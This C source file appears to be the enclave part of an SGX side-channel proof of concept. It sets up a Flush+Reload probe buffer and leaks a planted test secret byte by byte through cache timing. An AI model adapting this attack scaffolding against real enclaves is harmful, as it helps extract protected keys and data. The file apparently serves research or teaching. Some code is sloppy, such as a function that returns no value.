#include <stdarg.h>
#include <stdio.h>      /* vsnprintf */
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>

#include "Enclave.h"
#include "Enclave_t.h"  /* print_string */

#include "libcache/cacheutils.h"

#define enclave_printf       printf

//#define DEBUG_PRINT
#define SECRET "INACCESSIBLESECRET"

int printf(const char *fmt, ...)
{
    char buf[BUFSIZ] = {'\0'};
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, BUFSIZ, fmt, ap);
    va_end(ap);
    ocall_print_string(buf);
    return 0;
}

char * create_secret() {
  // allocate secret
char* secret = (char*)malloc(sizeof(char) * 128);

  if(secret == NULL) {
    enclave_printf("allocation of secret failed\n");
  }
  memcpy(secret, SECRET, sizeof(SECRET));

  return secret;
}

char* enc_encode(char c){
    cache_encode(c);
}

char leaked[sizeof(SECRET) + 1];

uint64_t ecall_init_attack(){
    pagesize = 4096;
    if(!CACHE_MISS)
        CACHE_MISS = detect_flush_reload_threshold();

#ifdef DEBUG_PRINT
    enclave_printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
#endif

    char *_mem = (char*)malloc(pagesize * (256 + 4));
    mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
    memset(mem, 0, pagesize * 256);

    flush_shared_memory();

    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(SECRET)] = 0;

    // return function pointer
    return (uint64_t)enc_encode;
}

int ecall_cache_decode(int index){
    cache_decode_pretty(leaked, index);
    if (leaked[index] == SECRET[index]){
#ifdef DEBUG_PRINT
        enclave_printf("[%d] leaked: %c\t(%d)\n", index, leaked[index], c);
#endif
        leaked[index] = ' ';
        return 1;
    }

    leaked[index] = ' ';
    return 0;
}
